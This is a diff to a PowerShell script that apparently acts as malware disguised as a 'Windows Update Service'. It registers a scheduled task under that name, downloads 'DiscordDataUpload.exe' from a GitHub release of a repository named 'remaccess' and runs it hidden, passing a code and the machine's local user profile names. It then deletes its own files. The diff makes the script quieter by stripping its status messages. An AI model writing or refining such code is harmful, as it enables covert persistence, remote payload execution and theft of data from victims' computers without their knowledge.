@@ -1,5 +1,6 @@
 $regPath = "HKLM:\Software\WindowsUpdateService"
-$userNames = Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }
+$userNamesRaw = Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }
+$userNames = $userNamesRaw -join " | "
 $exepath =  Join-Path $env:USERPROFILE "Music\DiscordDataUpload.exe"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
@@ -109,22 +110,12 @@ $updateserv = "Windows Update Service"
 if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
     # Task exists, so delete it
     Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
-    Write-Host "Task '$updateserv' deleted."
 } else {}
 Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
 Start-ScheduledTask -TaskName $updateserv
-#Temporary secion for remoaval of rudimentroy file and tasks
-$daemonserv = "Windows Update Service Daemon"
-if (Get-ScheduledTask -TaskName $daemonserv -ErrorAction SilentlyContinue) {
-    # Task exists, so delete it
-    Unregister-ScheduledTask -TaskName $daemonserv -Confirm:$false
-    Write-Host "Task '$daemonserv' deleted."
-} else {}
 #DataUpload
 Invoke-WebRequest -Uri $messageboturl -OutFile $exePath -UseBasicParsing
 Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $code
-Start-Sleep 2
-Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $name
 Start-Sleep 2
 Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $userNames
 Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
@@ -133,8 +124,6 @@ $ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateSe
 foreach ($file in $ps1Files) {
     if (Test-Path $file -PathType Leaf) {
         Remove-Item -Path $file -Force
-        Write-Host "File $file removed."
     } else {
-        Write-Host "File $file does not exist."
     }
 }
